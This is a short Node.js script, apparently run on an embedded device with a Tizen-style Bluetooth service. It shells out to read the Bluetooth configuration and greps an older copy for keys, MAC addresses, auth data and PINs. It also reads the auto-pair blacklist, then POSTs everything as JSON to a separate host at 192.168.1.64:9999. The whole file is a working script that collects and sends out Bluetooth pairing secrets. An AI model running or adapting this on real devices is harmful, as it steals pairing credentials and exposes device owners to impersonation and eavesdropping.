"use strict";
var http = require("http");
var cp = require("child_process");
function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
    req.on("error", function (e) { console.log("post err " + e.message); });
    req.write(data); req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 20000 }).slice(0, cap || 8000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
var out = {};
out.started = new Date().toISOString();
out.cfg = sh("cat /opt/usr/apps/bluetooth-frwk-service/data/bt_config.xml");
out.cfgold = sh("grep -iE 'key|mac|addr|7C:64|auth|pin' /opt/usr/apps/bluetooth-frwk-service/data/bt_config.old | head -30");
out.bl = sh("cat /opt/var/lib/bluetooth/auto-pair-blacklist");
post("/bt3", out);
post("/bt3_done", { started: out.started });
